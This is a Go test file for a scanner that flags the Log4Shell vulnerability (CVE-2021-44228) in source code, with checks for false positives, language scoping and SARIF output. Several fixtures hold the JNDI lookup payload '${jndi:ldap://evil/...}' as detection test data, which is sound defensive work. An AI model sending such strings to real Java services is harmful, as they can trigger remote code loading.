package tools

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"
)

func cveOf(rep *CVEReachabilityReport, cve string) *CVEPatternFinding {
	for i := range rep.Findings {
		if rep.Findings[i].CVE == cve {
			return &rep.Findings[i]
		}
	}
	return nil
}

func TestScanCVEPatternsLog4Shell(t *testing.T) {
	lib := newLibrary(t)
	dir := t.TempDir()
	mkProjFile(t, filepath.Join(dir, "src", "A.java"),
		"public class A {\n  void f(String u){ logger.info(\"${jndi:ldap://evil/\" + u); }\n}\n")
	rep, err := lib.ScanCVEPatterns(dir)
	if err != nil {
		t.Fatalf("ScanCVEPatterns: %v", err)
	}
	f := cveOf(rep, "CVE-2021-44228")
	if f == nil {
		t.Fatalf("expected Log4Shell finding; got %+v", rep.Findings)
	}
	if f.Line != 2 {
		t.Errorf("expected the jndi line 2, got %d", f.Line)
	}
	if !strings.EqualFold(f.Severity, "critical") {
		t.Errorf("Log4Shell severity = %q, want critical", f.Severity)
	}
	if filepath.ToSlash(f.File) != "src/A.java" {
		t.Errorf("file = %q, want src/A.java", f.File)
	}
}

// TestScanCVEPatternsCleanCodeNoFindings is the FP wall: ordinary code in
// the scanned languages must produce zero findings.
func TestScanCVEPatternsCleanCodeNoFindings(t *testing.T) {
	lib := newLibrary(t)
	dir := t.TempDir()
	mkProjFile(t, filepath.Join(dir, "A.java"), "public class A { int x = 1; }\n")
	mkProjFile(t, filepath.Join(dir, "main.c"), "int main(void){ return 0; }\n")
	mkProjFile(t, filepath.Join(dir, "app.go"), "package main\n\nfunc main() {}\n")
	rep, err := lib.ScanCVEPatterns(dir)
	if err != nil {
		t.Fatalf("ScanCVEPatterns: %v", err)
	}
	if len(rep.Findings) != 0 {
		t.Errorf("clean code should yield 0 findings, got %d: %+v", len(rep.Findings), rep.Findings)
	}
	if rep.PatternsActive == 0 {
		t.Error("expected a non-zero active-pattern count from the curated DB")
	}
	if rep.Findings == nil {
		t.Error("Findings should be non-nil ([]) for stable JSON")
	}
}

// TestScanCVEPatternsLanguageScoped proves a java-only CVE pattern is not
// applied to a Python file — the mechanism that keeps cross-language FPs out.
func TestScanCVEPatternsLanguageScoped(t *testing.T) {
	lib := newLibrary(t)
	dir := t.TempDir()
	// The Log4Shell trigger string, but in a .py file. Log4Shell declares
	// java/kotlin/scala, so it must NOT fire here.
	mkProjFile(t, filepath.Join(dir, "x.py"), "s = \"${jndi:ldap://evil/a}\"\n")
	rep, err := lib.ScanCVEPatterns(dir)
	if err != nil {
		t.Fatalf("ScanCVEPatterns: %v", err)
	}
	if f := cveOf(rep, "CVE-2021-44228"); f != nil {
		t.Errorf("Log4Shell (java) must not fire on a .py file, got %+v", f)
	}
}

func TestScanCVEPatternsSARIF(t *testing.T) {
	lib := newLibrary(t)
	dir := t.TempDir()
	mkProjFile(t, filepath.Join(dir, "A.java"),
		"class A { void f(String u){ logger.info(\"${jndi:ldap://x/\"+u); } }\n")
	rep, err := lib.ScanCVEPatterns(dir)
	if err != nil {
		t.Fatalf("ScanCVEPatterns: %v", err)
	}
	if cveOf(rep, "CVE-2021-44228") == nil {
		t.Fatalf("precondition: expected a Log4Shell finding to render")
	}
	out, err := json.Marshal(ScanCVEPatternsSARIF(rep))
	if err != nil {
		t.Fatalf("marshal SARIF: %v", err)
	}
	if !strings.Contains(string(out), "skills-mcp.CVE-2021-44228") {
		t.Errorf("SARIF should carry the CVE rule id:\n%s", out)
	}
}
